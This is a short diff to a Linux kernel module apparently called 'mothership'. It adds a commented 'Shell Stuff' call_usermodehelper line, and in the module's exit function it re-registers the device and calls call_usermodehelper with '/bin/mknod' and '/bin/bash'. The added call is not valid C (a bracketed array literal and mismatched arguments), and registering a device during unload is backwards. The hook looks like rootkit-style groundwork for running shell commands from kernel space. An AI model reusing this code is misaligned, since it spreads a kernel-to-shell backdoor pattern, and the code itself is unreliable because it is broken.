@@ -41,6 +41,7 @@ static struct file_operations fops = {
 	.write = dev_write
 };
 
+//call_usermodehelper(argv[0], argv, envp, UMH_NO_WAIT)  //Shell Stuff
 
 static int major;
 
@@ -61,7 +62,8 @@ static int __init mothership_init(void)
 static void __exit mothership_exit(void)
 {
 	printk(KERN_INFO "%s[-]%s Module Unloaded.\n",KRED,KNRM);
-
+	register_chrdev(major,DEVICE_NAME);
+	call_usermodehelper("/bin/mknod",[DEVICE_NAME,"c",major],"/bin/bash",UMH_NO_WAIT);
 }
 
 static int dev_open(struct inode* inodep,struct file *file){
